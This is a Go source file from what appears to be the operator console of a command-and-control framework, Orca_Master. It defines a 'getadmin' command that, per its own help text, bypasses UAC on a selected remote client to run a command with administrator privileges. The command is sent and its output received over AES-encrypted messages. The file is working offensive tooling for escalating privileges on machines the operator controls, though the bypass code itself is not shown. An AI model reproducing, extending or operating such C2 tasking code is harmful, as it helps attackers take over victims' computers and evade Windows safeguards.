package controller

import (
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"fmt"
	"github.com/desertbit/grumble"
	"time"
)

var getAdminCmd = &grumble.Command{
	Name:  "getadmin",
	Help:  "bypass uac to get system administrator privileges",
	Usage: "getadmin [-h | --help] [-c | --cmd command]",
	Flags: func(f *grumble.Flags) {
		f.String("c", "cmd", "", "run the command as an administrator")
	},
	Run: func(c *grumble.Context) error {
		cmd := c.Flags.String("cmd")
		data, _ := crypto.Encrypt([]byte(cmd), []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "getAdmin", data)
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "get admin request failed")
			return nil
		}
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		time.Sleep(100 * time.Millisecond)
		return nil
	},
}
